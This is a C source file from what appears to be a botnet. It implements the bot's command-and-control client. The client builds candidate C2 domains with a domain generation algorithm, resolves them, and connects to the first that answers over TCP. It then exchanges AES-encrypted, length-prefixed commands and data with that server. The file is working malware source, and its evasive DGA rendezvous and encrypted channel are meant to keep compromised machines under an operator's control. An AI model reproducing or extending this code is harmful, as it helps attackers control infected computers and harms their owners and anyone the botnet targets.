#include "../../include/botnet.h"
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <netdb.h>

#include "utils/dga.h"

int c2_sock = -1;
static pthread_mutex_t c2_send_mutex;

// Internal buffer for handling stream-based TCP data
static uint8_t recv_buf[4096];
static int recv_buf_pos = 0;

// Resolves a domain name to an IP address
static int resolve_host(const char *host, struct in_addr *addr) {
    struct hostent *he = gethostbyname(host);
    if (he == NULL || he->h_addr_list[0] == NULL) {
        return 0; // Resolution failed
    }
    memcpy(addr, he->h_addr_list[0], sizeof(struct in_addr));
    return 1;
}

int c2_connect() {
    char domains[MAX_DGA_DOMAINS][256];
    int num_domains = dga_generate_domains(domains);

    printf("[*] Attempting to connect to C2 via DGA domains...\n");

    for (int i = 0; i < num_domains; i++) {
        struct in_addr c2_ip;
        printf("    -> Resolving %s...\n", domains[i]);
        if (resolve_host(domains[i], &c2_ip)) {
            printf("    [+] Domain %s resolved to %s\n", domains[i], inet_ntoa(c2_ip));

            c2_sock = socket(AF_INET, SOCK_STREAM, 0);
            if (c2_sock < 0) continue;

            struct sockaddr_in c2_addr;
            c2_addr.sin_family = AF_INET;
            c2_addr.sin_port = htons(C2_PORT);
            c2_addr.sin_addr = c2_ip;

            if (connect(c2_sock, (struct sockaddr *)&c2_addr, sizeof(c2_addr)) == 0) {
                fcntl(c2_sock, F_SETFL, O_NONBLOCK);
                pthread_mutex_init(&c2_send_mutex, NULL);
                recv_buf_pos = 0; // Reset buffer on new connection
                printf("[+] C2 connection established through %s\n", domains[i]);
                return 1;
            }
            close(c2_sock);
            c2_sock = -1;
        }
    }

    printf("[-] Failed to connect to any DGA domains.\n");
    return 0;
}

void c2_disconnect() {
    if (c2_sock != -1) {
        close(c2_sock);
        c2_sock = -1;
        pthread_mutex_destroy(&c2_send_mutex);
    }
}

int c2_send(char *data, int len) {
    if (c2_sock == -1) return -1;

    uint8_t encrypted_buf[2048];
    int encrypted_len = aes_encrypt((uint8_t*)data, len, encrypted_buf);
    if (encrypted_len < 0 || encrypted_len > sizeof(encrypted_buf)) {
        return -1; // Encryption failed or buffer too small
    }

    uint16_t net_len = htons(encrypted_len);
    
    uint8_t final_buf[sizeof(net_len) + encrypted_len];
    memcpy(final_buf, &net_len, sizeof(net_len));
    memcpy(final_buf + sizeof(net_len), encrypted_buf, encrypted_len);
    int total_to_send = sizeof(net_len) + encrypted_len;

    pthread_mutex_lock(&c2_send_mutex);
    int bytes_sent = send(c2_sock, final_buf, total_to_send, 0);
    pthread_mutex_unlock(&c2_send_mutex);

    if (bytes_sent != total_to_send) {
        return -1; // Error or partial send
    }

    return len; // Return original length on success
}

int c2_recv(char *out_buffer, int max_len) {
    if (c2_sock == -1) return -1;

    int bytes_read = recv(c2_sock, recv_buf + recv_buf_pos, sizeof(recv_buf) - recv_buf_pos, 0);
    if (bytes_read <= 0) {
        return bytes_read;
    }
    recv_buf_pos += bytes_read;

    if (recv_buf_pos < sizeof(uint16_t)) {
        return 0; // Not enough data for a header
    }

    uint16_t payload_len = ntohs(*(uint16_t*)recv_buf);
    int total_msg_len = sizeof(uint16_t) + payload_len;

    if (recv_buf_pos < total_msg_len) {
        return 0; // Not enough data for the full message
    }

    uint8_t* encrypted_payload = recv_buf + sizeof(uint16_t);
    int decrypted_len = aes_decrypt(encrypted_payload, payload_len);

    if (decrypted_len < 0 || decrypted_len > max_len) {
        recv_buf_pos = 0; // Corrupted message, reset buffer
        return -1;
    }

    memcpy(out_buffer, encrypted_payload, decrypted_len);

    if (recv_buf_pos > total_msg_len) {
        memmove(recv_buf, recv_buf + total_msg_len, recv_buf_pos - total_msg_len);
    }
    recv_buf_pos -= total_msg_len;

    return decrypted_len;
}

int get_c2_sock() {
    return c2_sock;
}
